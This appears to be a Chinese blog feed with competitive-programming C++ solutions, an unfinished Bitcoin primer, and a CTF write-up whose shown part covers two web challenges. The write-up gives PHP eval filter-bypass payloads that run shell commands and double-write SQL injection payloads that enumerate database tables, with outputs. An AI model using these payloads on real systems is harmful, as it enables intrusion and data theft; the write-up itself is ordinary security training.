class="token punctuation">&#123;</span>    dfn<span class="token punctuation">[</span>x<span class="token punctuation">]</span> <span class="token operator">=</span> low<span class="token punctuation">[</span>x<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">++</span>nd<span class="token punctuation">;</span>    vis<span class="token punctuation">[</span>x<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    st<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> head<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">;</span> i<span class="token punctuation">;</span> i <span class="token operator">=</span> edge<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>next<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> v <span class="token operator">=</span> edge<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>to<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>dfn<span class="token punctuation">[</span>v<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token function">tarjan</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token punctuation">;</span>            low<span class="token punctuation">[</span>x<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span>low<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">,</span> low<span class="token punctuation">[</span>v<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>vis<span class="token punctuation">[</span>v<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            low<span class="token punctuation">[</span>x<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span>low<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">,</span> dfn<span class="token punctuation">[</span>v<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>low<span class="token punctuation">[</span>x<span class="token punctuation">]</span> <span class="token operator">==</span> dfn<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> cnt <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        tot_team<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">int</span> now <span class="token operator">=</span> st<span class="token punctuation">.</span><span class="token function">top</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            st<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            vis<span class="token punctuation">[</span>now<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>            team<span class="token punctuation">[</span>now<span class="token punctuation">]</span> <span class="token operator">=</span> tot_team<span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>now <span class="token operator">==</span> x<span class="token punctuation">)</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> dp<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">topo</span><span class="token punctuation">(</span><span class="token keyword">int</span> s<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    queue<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> que<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> tot_team<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>in<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>            que<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>        dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span>inf<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    dp<span class="token punctuation">[</span>team<span class="token punctuation">[</span>s<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> team_value<span class="token punctuation">[</span>team<span class="token punctuation">[</span>s<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>que<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> tp <span class="token operator">=</span> que<span class="token punctuation">.</span><span class="token function">front</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        que<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> u <span class="token operator">=</span> head2<span class="token punctuation">[</span>tp<span class="token punctuation">]</span><span class="token punctuation">;</span> u<span class="token punctuation">;</span> u <span class="token operator">=</span> edge2<span class="token punctuation">[</span>u<span class="token punctuation">]</span><span class="token punctuation">.</span>next<span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">int</span> v <span class="token operator">=</span> edge2<span class="token punctuation">[</span>u<span class="token punctuation">]</span><span class="token punctuation">.</span>to<span class="token punctuation">;</span>            dp<span class="token punctuation">[</span>v<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>v<span class="token punctuation">]</span><span class="token punctuation">,</span> dp<span class="token punctuation">[</span>tp<span class="token punctuation">]</span> <span class="token operator">+</span> edge2<span class="token punctuation">[</span>u<span class="token punctuation">]</span><span class="token punctuation">.</span>w <span class="token operator">+</span> team_value<span class="token punctuation">[</span>v<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            in<span class="token punctuation">[</span>v<span class="token punctuation">]</span><span class="token operator">--</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>in<span class="token punctuation">[</span>v<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>                que<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">int</span> ans <span class="token operator">=</span> INT_MIN<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> tot_team<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        ans <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>ans<span class="token punctuation">,</span> dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>            cout <span class="token operator">&lt;&lt;</span> ans <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    cin <span class="token operator">>></span> n <span class="token operator">>></span> m<span class="token punctuation">;</span>    <span class="token keyword">int</span> u<span class="token punctuation">,</span> v<span class="token punctuation">,</span> ini<span class="token punctuation">;</span>    db re<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> m<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        cin <span class="token operator">>></span> u <span class="token operator">>></span> v <span class="token operator">>></span> ini <span class="token operator">>></span> re<span class="token punctuation">;</span>        re <span class="token operator">+=</span> <span class="token number">1e-6</span><span class="token punctuation">;</span>        <span class="token function">addedge</span><span class="token punctuation">(</span>u<span class="token punctuation">,</span> v<span class="token punctuation">,</span> ini<span class="token punctuation">,</span> re<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>dfn<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token function">tarjan</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> m<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>team<span class="token punctuation">[</span>edge<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>from<span class="token punctuation">]</span> <span class="token operator">!=</span> team<span class="token punctuation">[</span>edge<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>to<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token function">addedge2</span><span class="token punctuation">(</span>team<span class="token punctuation">[</span>edge<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>from<span class="token punctuation">]</span><span class="token punctuation">,</span> team<span class="token punctuation">[</span>edge<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>to<span class="token punctuation">]</span><span class="token punctuation">,</span> edge<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>w<span class="token punctuation">)</span><span class="token punctuation">;</span>            in<span class="token punctuation">[</span>team<span class="token punctuation">[</span>edge<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>to<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span>        <span class="token punctuation">&#123;</span>            team_value<span class="token punctuation">[</span>team<span class="token punctuation">[</span>edge<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>from<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token function">cal</span><span class="token punctuation">(</span>edge<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>w<span class="token punctuation">,</span> edge<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>reco<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    cin <span class="token operator">>></span> s<span class="token punctuation">;</span>    <span class="token function">topo</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">// freopen("out","w",stdout);</span>    <span class="token comment">//freopen("text", "r", stdin);</span>    ios<span class="token double-colon punctuation">::</span><span class="token function">sync_with_stdio</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cin<span class="token punctuation">.</span><span class="token function">tie</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> T <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>      <span class="token comment">// cin >> T;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>T<span class="token operator">--</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h4 id="P1122-最大子树和"><a href="#P1122-最大子树和" class="headerlink" title="P1122 最大子树和"></a><a href="https://www.luogu.com.cn/problem/P1122">P1122 最大子树和</a></h4><ul><li><p>题意：<br>按题意求最大子树和。</p></li><li><p>题解：<br>比较简单的一道树形DP，$dp[i]$表示第i个子树（包括根节点）的最大子树和。转移方程：<br>$dp[u] += (dp[v]&gt;0 \, ? \, dp[v]  \, : \, 0)$，v是u的子节点</p></li></ul><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> n<span class="token punctuation">;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> mp<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> a<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> dp<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">dfs</span><span class="token punctuation">(</span><span class="token keyword">int</span> rt<span class="token punctuation">,</span> <span class="token keyword">int</span> fa<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    dp<span class="token punctuation">[</span>rt<span class="token punctuation">]</span> <span class="token operator">=</span> a<span class="token punctuation">[</span>rt<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">&amp;</span>it <span class="token operator">:</span> mp<span class="token punctuation">[</span>rt<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>it <span class="token operator">==</span> fa<span class="token punctuation">)</span>            <span class="token keyword">continue</span><span class="token punctuation">;</span>        <span class="token function">dfs</span><span class="token punctuation">(</span>it<span class="token punctuation">,</span> rt<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>dp<span class="token punctuation">[</span>it<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span>            dp<span class="token punctuation">[</span>rt<span class="token punctuation">]</span> <span class="token operator">+=</span> dp<span class="token punctuation">[</span>it<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    cin <span class="token operator">>></span> n<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        cin <span class="token operator">>></span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">int</span> u<span class="token punctuation">,</span> v<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        cin <span class="token operator">>></span> u <span class="token operator">>></span> v<span class="token punctuation">;</span>        mp<span class="token punctuation">[</span>u<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token punctuation">;</span>        mp<span class="token punctuation">[</span>v<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>u<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">dfs</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> ans <span class="token operator">=</span> INT_MIN<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        ans <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> ans<span class="token punctuation">)</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> ans <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 算法竞赛 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>BTC相关知识</title>
      <link href="/2021/09/17/%E6%AF%94%E7%89%B9%E5%B8%81%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
      <url>/2021/09/17/%E6%AF%94%E7%89%B9%E5%B8%81%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
      
        <content type="html"><![CDATA[<h2 id="1-BTC密码学原理"><a href="#1-BTC密码学原理" class="headerlink" title="1. BTC密码学原理"></a>1. BTC密码学原理</h2><p>比特币属于加密货币，可见其中必然会涉及到密码学的知识。而比特币本身开放，其交易记录、交易金额、交易内容甚至源代码都面向全网开放。</p><h3 id="1-1-Hash和Hash碰撞"><a href="#1-1-Hash和Hash碰撞" class="headerlink" title="1.1 Hash和Hash碰撞"></a>1.1 Hash和Hash碰撞</h3><p>给定x和y，且有x!=y，但给定一个哈希函数Hash(),可以得到Hash(x)=Hash(y)，则称为hash碰撞。collision resistance可以简单理解为扛碰撞性，这个性质可以保证,如果有Hash(x)!=Hash(y)，必然可以得到x!=y。在BTC系统中，使用的是SHA-256算法，输出的空间大小有$2^{256}$，所以基本认为人为创造Hash碰撞概率为0。</p><h3 id="1-2-工作量证明（POW）"><a href="#1-2-工作量证明（POW）" class="headerlink" title="1.2 工作量证明（POW）"></a>1.2 工作量证明（POW）</h3><p>在比特币中要求，合法的区块必须满足：<br>$H(block header)≤target$</p><p>在区块头（block header）中有一个域nonce，穷举计算nonce，计算block header哈希值小于target，确定一个合法区块。</p><p>区块链的工作原理，记账节点（矿工）收集网络上广播的交易（tx）,维护一个交易集合，将若干笔交易打包，计算交易列表hash，放在block header中，穷举nonce域，使$H(block header)≤target$。</p><p>由于Hash函数的puzzle friendly特性，只能使用穷举算法。挖矿的主要工作就是通过穷举计算，找到符合条件的区块头。矿工找到符合条件块头，就获得了记账权，获得出块奖励和交易费，矿工要把这个区块信息发布到网络上，以便其他矿工能够收到这个区块信息。</p><h3 id="1-3-账户信息"><a href="#1-3-账户信息" class="headerlink" title="1.3 账户信息"></a>1.3 账户信息</h3><p>非对称加密算法需要两个密钥：公开密钥（publickey:简称公钥）和私有密钥（privatekey:简称私钥）。公钥与私钥是一对，如果用公钥对数据进行加密，只有用对应的私钥才能解密。在比特币中，用户可以自己创建一个公私钥对，公钥就作为用户的账户信息。利用公私钥实现信息的保密通信和数字签名。</p><h3 id="1-4"><a href="#1-4" class="headerlink" title="1.4"></a>1.4</h3><h2 id="2-BTC数据结构"><a href="#2-BTC数据结构" class="headerlink" title="2. BTC数据结构"></a>2. BTC数据结构</h2>]]></content>
      
      
      <categories>
          
          <category> 区块链 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>neuq 2021 招新赛web</title>
      <link href="/2021/08/29/neuq-2021-%E6%8B%9B%E6%96%B0%E8%B5%9Bweb/"/>
      <url>/2021/08/29/neuq-2021-%E6%8B%9B%E6%96%B0%E8%B5%9Bweb/</url>
      
        <content type="html"><![CDATA[<h2 id="Result"><a href="#Result" class="headerlink" title="Result"></a>Result</h2><p>9道WEB题目做出了6道，外加一道misc白给题。第一次打CTF，感觉和ACM不一样，36H的时间有点长。大佬们都太强了orz。</p><h2 id="easy-eval"><a href="#easy-eval" class="headerlink" title="easy_eval"></a>easy_eval</h2><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/system|flag/"</span> <span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"id"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no system or flag!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"id"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>这道题目就是一个简单的命令执行，发现把system和flag过滤掉了，那直接使用字符拼接就能完成。<br><pre class="language-php" data-language="php"><code class="language-php">payload1<span class="token punctuation">:</span><span class="token operator">?</span>id<span class="token operator">=</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token string double-quoted-string">"sys"</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token string double-quoted-string">"tem"</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$a</span><span class="token operator">.</span><span class="token variable">$b</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"cd /;ls -a"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>结果<span class="token punctuation">:</span>发现存在flaGGggGg<span class="token operator">.</span>txt文件，直接打开就行了。 payload2<span class="token punctuation">:</span><span class="token operator">?</span>id<span class="token operator">=</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token string double-quoted-string">"sys"</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token string double-quoted-string">"tem"</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$a</span><span class="token operator">.</span><span class="token variable">$b</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"cd /;cat flaGGggGg"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 得到答案<span class="token punctuation">:</span>flag<span class="token punctuation">&#123;</span><span class="token number">0</span>cc175b9c0f12fd62f2e39dfbtahfa<span class="token punctuation">&#125;</span></code></pre></p><h2 id="check-in-sql"><a href="#check-in-sql" class="headerlink" title="check_in_sql"></a>check_in_sql</h2><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span> <span class="token string double-quoted-string">"config.php"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"sql"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/select/"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"sql"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// var_dump($sql);</span>    <span class="token variable">$r</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$mysqli</span><span class="token punctuation">,</span><span class="token variable">$sql</span><span class="token operator">.</span><span class="token string double-quoted-string">"LionTreeNB"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$r</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$r</span><span class="token operator">-></span><span class="token property">num_rows</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$r</span><span class="token operator">-></span><span class="token function">fetch_assoc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>这道题目就是一个简单的sql注入题，注意使用双写绕过就行。</p><pre class="language-sql" data-language="sql"><code class="language-sql">payload1: ?<span class="token keyword">sql</span><span class="token operator">=</span>selselectect <span class="token number">1</span><span class="token punctuation">,</span>version<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span>结果:array<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> &#123; <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span> string<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token string">"1"</span> <span class="token punctuation">[</span><span class="token string">"version()"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span> string<span class="token punctuation">(</span><span class="token number">23</span><span class="token punctuation">)</span> <span class="token string">"5.7.26-0ubuntu0.18.04.1"</span> <span class="token punctuation">[</span><span class="token string">"LionTreeNB"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span> string<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token string">"web"</span> &#125;发现有回显，并且发现web数据库payload2: <span class="token keyword">sql</span><span class="token operator">=</span>selselectect <span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">(</span>selselectect group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token string">'web'</span><span class="token punctuation">)</span>结果:array<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> &#123; <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span> string<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token string">"1"</span> <span class="token punctuation">[</span><span class="token string">"LionTreeNB"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span> string<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span> <span class="token string">"users"</span> &#125;发现有个users表payload3: ?<span class="token keyword">sql</span><span class="token operator">=</span>selselectect <span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">(</span>selselectect group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span><span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token string">'web'</span> <span class="token operator">and</span> table_name<span class="token operator">=</span><span class="token string">'users'</span><span class="token punctuation">)</span>结果: array<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> &#123; <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span> string<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token string">"1"</span> <span 